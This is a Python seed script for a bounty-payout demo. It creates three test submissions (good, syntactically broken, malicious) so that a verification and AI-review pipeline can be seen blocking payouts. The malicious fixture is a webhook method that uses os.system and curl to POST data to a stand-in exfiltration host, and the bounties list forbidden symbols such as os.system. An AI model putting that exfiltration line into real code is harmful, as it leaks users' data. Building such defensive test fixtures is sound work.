from decimal import Decimal
import json
import logging
from typing import Any, Dict, Tuple
from sqlalchemy.orm import Session

from app.database import Base, SessionLocal, engine, init_db
from app.models import (
    BountyModel,
    BountyStatus,
    SubmissionModel,
    SubmissionStatus,
)

logger = logging.getLogger(__name__)

# --- Scenario Code Diffs ---

GOOD_DIFF = """
class RateLimiter:
    def __init__(self, max_requests: int = 100, window_seconds: int = 60):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.history = {}

    def check_rate_limit(self, client_ip: str) -> bool:
        \"\"\"Validates client request rate against sliding window threshold.\"\"\"
        import time
        now = time.time()
        calls = self.history.get(client_ip, [])
        calls = [t for t in calls if now - t < self.window_seconds]
        if len(calls) >= self.max_requests:
            return False
        calls.append(now)
        self.history[client_ip] = calls
        return True
""".strip()

BROKEN_DIFF = """
class StreamParser:
    def stream_parse(self, chunk: bytes):
        # Broken syntax: missing closing parenthesis and syntax error
        if len(chunk == 0:
            return None
""".strip()

MALICIOUS_DIFF = """
class WebhookDispatcher:
    def dispatch(self, target_url: str, payload: dict):
        # Injected exfiltration payload
        import os
        os.system("curl -X POST https://evil-exfiltrator.com/steal --data " + str(payload))
        return {"status": "dispatched"}
""".strip()


def seed_demo_scenarios(db: Session) -> dict[str, Any]:
    """Seeds ONLY bounties and raw submissions without pre-approvals.
    Requires running the live verification suite, Gemini AI review, and maintainer approval
    interactively through the dashboard or API to demonstrate the real guarded workflow.
    """
    init_db()

    # --- Scenario 1: Good Submission (Candidate for Approval & Payout) ---
    bounty_good = BountyModel(
        title="Implement sliding window RateLimiter middleware",
        description="Provide a production-ready RateLimiter class with sliding window check_rate_limit method.",
        amount=Decimal("350.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=json.dumps({
            "required_symbols": ["RateLimiter", "check_rate_limit"],
            "forbidden_symbols": ["eval", "os.system"],
            "min_score": 0.85,
        }),
    )
    db.add(bounty_good)
    db.commit()
    db.refresh(bounty_good)

    sub_good = SubmissionModel(
        bounty_id=bounty_good.id,
        contributor_email="top_contributor@example.com",
        pr_url="https://github.com/example/repo/pull/101",
        code_diff=GOOD_DIFF,
        commit_sha="a1b2c3d4e5f67890",
        diff_source="preseeded_fixture",
        status=SubmissionStatus.PENDING.value,
        ci_passed=False,
        maintainer_approved=False,
    )
    db.add(sub_good)
    db.commit()
    db.refresh(sub_good)

    # --- Scenario 2: Broken Submission (Candidate for Verification Failure) ---
    bounty_broken = BountyModel(
        title="StreamParser buffer management",
        description="Implement stream_parse and cleanup_buffer functions for streaming chunk parsing.",
        amount=Decimal("200.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=json.dumps({
            "required_symbols": ["stream_parse", "cleanup_buffer"],
            "forbidden_symbols": [],
            "min_score": 0.80,
        }),
    )
    db.add(bounty_broken)
    db.commit()
    db.refresh(bounty_broken)

    sub_broken = SubmissionModel(
        bounty_id=bounty_broken.id,
        contributor_email="novice_dev@example.com",
        pr_url="https://github.com/example/repo/pull/102",
        code_diff=BROKEN_DIFF,
        commit_sha="b2c3d4e5f6a7b8c9",
        diff_source="preseeded_fixture",
        status=SubmissionStatus.PENDING.value,
        ci_passed=False,
        maintainer_approved=False,
    )
    db.add(sub_broken)
    db.commit()
    db.refresh(sub_broken)

    # --- Scenario 3: Malicious Submission (Candidate for Static/AI Rejection) ---
    bounty_malicious = BountyModel(
        title="Webhook dispatch utility",
        description="Implement dispatch method to send JSON payloads to target webhooks securely.",
        amount=Decimal("500.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=json.dumps({
            "required_symbols": ["WebhookDispatcher", "dispatch"],
            "forbidden_symbols": ["os.system", "subprocess"],
            "min_score": 0.90,
        }),
    )
    db.add(bounty_malicious)
    db.commit()
    db.refresh(bounty_malicious)

    sub_malicious = SubmissionModel(
        bounty_id=bounty_malicious.id,
        contributor_email="adversary@evil.org",
        pr_url="https://github.com/example/repo/pull/103",
        code_diff=MALICIOUS_DIFF,
        commit_sha="deadbeef12345678",
        diff_source="preseeded_fixture",
        status=SubmissionStatus.PENDING.value,
        ci_passed=False,
        maintainer_approved=False,
    )
    db.add(sub_malicious)
    db.commit()
    db.refresh(sub_malicious)

    return {
        "scenario_1_good": {
            "bounty_id": bounty_good.id,
            "submission_id": sub_good.id,
            "instruction": "Click 'Run Verification Suite' -> 'Run Gemini AI Review' -> 'Maintainer Sign-Off' -> 'Execute Payout'",
        },
        "scenario_2_broken": {
            "bounty_id": bounty_broken.id,
            "submission_id": sub_broken.id,
            "instruction": "Click 'Run Verification Suite' to observe AST syntax error blocking payout",
        },
        "scenario_3_malicious": {
            "bounty_id": bounty_malicious.id,
            "submission_id": sub_malicious.id,
            "instruction": "Click 'Run Gemini AI Review' to observe static security pre-check blocking payout",
        },
    }


if __name__ == "__main__":
    db = SessionLocal()
    try:
        summary = seed_demo_scenarios(db)
        print("Seeded scenarios successfully:")
        print(json.dumps(summary, indent=2))
    finally:
        db.close()
